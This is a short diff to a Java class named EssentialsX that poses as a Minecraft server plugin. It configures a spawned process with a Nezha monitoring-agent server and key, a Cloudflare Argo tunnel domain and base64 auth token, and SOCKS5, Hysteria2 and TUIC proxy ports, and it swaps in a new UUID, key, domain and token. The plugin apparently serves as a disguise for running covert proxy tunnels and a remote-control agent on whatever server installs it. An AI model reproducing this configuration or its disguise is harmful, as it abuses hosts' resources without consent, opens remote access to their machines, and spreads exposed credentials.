@@ -73,14 +73,14 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "a36f24af-a1f2-4235-86c9-96b4bfa5c6e3");
+        env.put("UUID", "4a414f33-e2dd-46d8-8573-a2d94cb51457");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nezha.babiq.eu.org");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "0ZSxg59BP1rSkThZOh");
+        env.put("NEZHA_KEY", "4XKcsNQ6tmUcrvyYA9");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "cuberno.future13800.eu.org");
-        env.put("ARGO_AUTH", "eyJhIjoiNjc0MmMxNDI5ZDE4OTA3NjMzZjMyZjQ2MWM5MzUwOWMiLCJ0IjoiM2FiZTg0OGYtODc2Yy00OTZjLWE3ZTItMDEwODZkZjI5NmEyIiwicyI6Ik9UWTNNR0ptWXpZdFlXTTJOaTAwTnpFeUxUazNabU10WkdVMVl6VTJNbU13TWpJeSJ9");
+        env.put("ARGO_DOMAIN", "cuberno1.future13800.eu.org");
+        env.put("ARGO_AUTH", "eyJhIjoiNjc0MmMxNDI5ZDE4OTA3NjMzZjMyZjQ2MWM5MzUwOWMiLCJ0IjoiM2IwN2IwM2MtOTBjNC00ODI5LWI3MTktYmY1NWIzYjRhZTJlIiwicyI6Ik9HWmhZMkU1TW1VdE5tSTJNaTAwWWpRNExXSTBOVFl0WmpVNU5tTTJNR1UwTkRsayJ9");
         env.put("S5_PORT", "20096");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
